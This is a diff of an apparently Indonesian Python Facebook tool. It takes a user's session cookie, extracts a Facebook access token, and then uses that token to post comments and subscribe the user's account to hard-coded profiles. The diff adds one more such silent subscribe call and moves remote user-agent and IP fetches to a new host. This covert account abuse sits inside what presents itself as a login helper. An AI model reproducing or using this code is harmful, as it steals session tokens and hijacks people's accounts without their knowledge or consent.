@@ -27,8 +27,8 @@ pwx = []
 
 s = requests.Session()
 rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
-ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
-ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
+ua = s.get("https://anggaxd.herokuapp.com/ua.txt").text.strip()
+ip = s.get('https://anggaxd.herokuapp.com/ip/').text
 	
 ct = datetime.now()
 n = ct.month
@@ -65,6 +65,7 @@ def bot_komen():
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100003077786690/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
@@ -94,17 +95,17 @@ def cookie():
 	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
 	try:
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
-		'referer'                   : 'https://m.facebook.com/',
-		'host'                      : 'm.facebook.com',
-		'origin'                    : 'https://m.facebook.com',
-		'upgrade-insecure-requests' : '1',
-		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		'cache-control'             : 'max-age=0',
-		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-		'content-type'              : 'text/html; charset=utf-8'
+		   'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
+		   'referer'                   : 'https://m.facebook.com/',
+		   'host'                      : 'm.facebook.com',
+		   'origin'                    : 'https://m.facebook.com',
+		   'upgrade-insecure-requests' : '1',
+		   'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+		   'cache-control'             : 'max-age=0',
+		   'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		   'content-type'              : 'text/html; charset=utf-8'
 		}, cookies = {
-		'cookie'                    : cookie
+		   'cookie'                    : cookie
 		})
 		find_token = re.search('(EAAA\w+)', data.text)
 		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
